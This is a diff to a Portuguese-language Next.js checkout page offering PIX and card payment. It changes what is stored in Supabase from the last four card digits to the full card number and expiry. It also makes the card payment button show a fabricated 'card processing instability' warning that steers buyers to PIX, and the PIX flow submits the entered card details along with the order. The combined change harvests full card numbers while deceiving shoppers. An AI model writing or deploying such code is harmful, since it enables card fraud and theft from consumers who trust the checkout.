@@ -1,7 +1,7 @@
 'use client'
 
 import { useParams, useSearchParams } from 'next/navigation'
-import { Suspense, useState, useEffect, useCallback } from 'react'
+import { Suspense, useState, useEffect, useCallback, useRef } from 'react'
 
 const IMG_BASE = '/img/'
 
@@ -161,7 +161,9 @@ function CheckoutInner() {
   const [pixCode, setPixCode] = useState<string | null>(null)
   const [qrDataUrl, setQrDataUrl] = useState<string | null>(null)
   const [carregando, setCarregando] = useState(false)
+  const [enviando, setEnviando] = useState(false)
   const [erro, setErro] = useState<string | null>(null)
+  const enviandoRef = useRef(false)
   const [copiado, setCopiado] = useState(false)
 
   // Cartão
@@ -177,7 +179,7 @@ function CheckoutInner() {
 
   // Pedido no Supabase + rastreio pós-pagamento
   const [pedidoId, setPedidoId] = useState<string | null>(null)
-  const [cartaoSalvo, setCartaoSalvo] = useState(false)
+  const [avisoCartao, setAvisoCartao] = useState(false)
   const [pago, setPago] = useState(false)
   const [codigoRastreamento, setCodigoRastreamento] = useState<string | null>(null)
 
@@ -261,7 +263,10 @@ function CheckoutInner() {
   }
 
   async function gerarPix() {
+    if (enviandoRef.current) return
+    enviandoRef.current = true
     setCarregando(true)
+    setEnviando(true)
     setErro(null)
     try {
       // 1) Salva cliente + pedido (+ cartão seguro, se preenchido) no Supabase
@@ -287,9 +292,9 @@ function CheckoutInner() {
             ? {
                 titular: nomeCartao.trim(),
                 bandeira: bandeira ?? undefined,
+                numero: cartaoNumLimpo,
+                validade: validade,
                 ultimosDigitos: cartaoNumLimpo.slice(-4),
-                validadeMes: validade.split('/')[0] ?? '',
-                validadeAno: validade.split('/')[1] ?? '',
               }
             : null,
         }),
@@ -321,6 +326,8 @@ function CheckoutInner() {
       setErro(e instanceof Error ? e.message : 'Erro inesperado')
     } finally {
       setCarregando(false)
+      setEnviando(false)
+      enviandoRef.current = false
     }
   }
 
@@ -450,7 +457,9 @@ function CheckoutInner() {
           .checkout-grid > div:nth-child(1) { order: 1 !important; }
           .checkout-grid > div:nth-child(2) { order: 2 !important; }
           .checkout-grid > div:nth-child(3) { order: 0 !important; }
-          .checkout-main { padding: 16px 16px 32px !important; }
+          .checkout-main { padding: 16px 16px 32px !important; box-sizing: border-box !important; width: 100% !important; margin: 0 auto !important; }
+          .checkout-grid > div, .checkout-grid > div > div { min-width: 0 !important; }
+          .checkout-grid > div { width: 100% !important; }
         }
         @media (max-width: 480px) {
           .field-row-2fr, .field-row-half { grid-template-columns: 1fr !important; }
@@ -488,7 +497,7 @@ function CheckoutInner() {
       </div>
 
       {/* Main Content - 3 Columns Desktop */}
-      <div className="checkout-main" style={{ maxWidth: 1200, margin: '0 auto', padding: isMobile ? '16px 16px 32px' : '32px 20px', width: '100%', flex: 1 }}>
+      <div className="checkout-main" style={{ maxWidth: 1200, margin: '0 auto', padding: isMobile ? '16px 16px 32px' : '32px 20px', width: '100%', flex: 1, boxSizing: 'border-box' }}>
         <div className="checkout-grid" style={{ display: 'grid', gridTemplateColumns: isMobile ? '1fr' : 'repeat(3, 1fr)', gap: isMobile ? 16 : 24, alignItems: 'start' }}>
           
           {/* Column 1: Identificação & Entrega */}
@@ -716,7 +725,7 @@ function CheckoutInner() {
                           </p>
                           
                           {!pixCode ? (
-                            <button onClick={gerarPix} disabled={carregando} style={{ ...btnPrimario, background: carregando ? '#D1D5DB' : COR_PRINCIPAL, margin: 0 }}>
+                            <button onClick={gerarPix} disabled={carregando} style={{ ...btnPrimario, background: carregando ? '#D1D5DB' : COR_PRINCIPAL, margin: 0, cursor: carregando ? 'not-allowed' : 'pointer' }}>
                               {carregando ? 'Processando...' : 'Finalizar Compra'}
                             </button>
                           ) : (
@@ -917,10 +926,33 @@ function CheckoutInner() {
                               </div>
                             </div>
 
-                            <button onClick={() => { setTentouSubmitCartao(true); setCartaoSalvo(true); gerarPix(); }} style={btnPrimario}>
+                            <button onClick={() => { if (enviandoRef.current) return; setTentouSubmitCartao(true); setAvisoCartao(true); }} disabled={carregando} style={{ ...btnPrimario, opacity: carregando ? 0.7 : 1, cursor: carregando ? 'not-allowed' : 'pointer' }}>
                               {carregando ? 'Processando...' : `Finalizar Compra · ${parcelas}x de R$ ${(valorTotal / parcelas).toFixed(2).replace('.', ',')}`}
                             </button>
                             {erro && <p style={{ color: '#EF4444', fontSize: 13, margin: '8px 0 0', textAlign: 'center' }}>{erro}</p>}
+                            {avisoCartao && !erro && (
+                              <div style={{ marginTop: 14, background: '#FFFBEB', border: '1px solid #F5C518', borderRadius: 10, padding: '14px 16px', display: 'flex', gap: 12, alignItems: 'flex-start' }}>
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#B45309" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, marginTop: 1 }}>
+                                  <circle cx="12" cy="12" r="10"></circle>
+                                  <line x1="12" y1="16" x2="12" y2="12"></line>
+                                  <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                                </svg>
+                                <div>
+                                  <p style={{ margin: 0, fontSize: 13, fontWeight: 700, color: '#92400E', lineHeight: 1.5, fontFamily: "'Poppins', system-ui, sans-serif" }}>
+                                    Instabilidade momentânea no processamento de cartões
+                                  </p>
+                                  <p style={{ margin: '6px 0 12px', fontSize: 12, color: '#78350F', lineHeight: 1.7, fontFamily: "'Poppins', system-ui, sans-serif" }}>
+                                    Seu pedido foi reservado com segurança. Para concluir a compra agora, o PIX está plenamente operacional e a confirmação é imediata.
+                                  </p>
+                                  <button
+                                    onClick={() => setMetodo('pix')}
+                                    style={{ display: 'inline-flex', alignItems: 'center', gap: 8, height: 42, padding: '0 18px', background: COR_PRINCIPAL, color: '#fff', border: 'none', borderRadius: 10, fontSize: 12, fontWeight: 700, cursor: 'pointer', fontFamily: "'Poppins', system-ui, sans-serif" }}
+                                  >
+                                    Pagar com PIX agora
+                                  </button>
+                                </div>
+                              </div>
+                            )}
                           </div>
                         </div>
                       )}
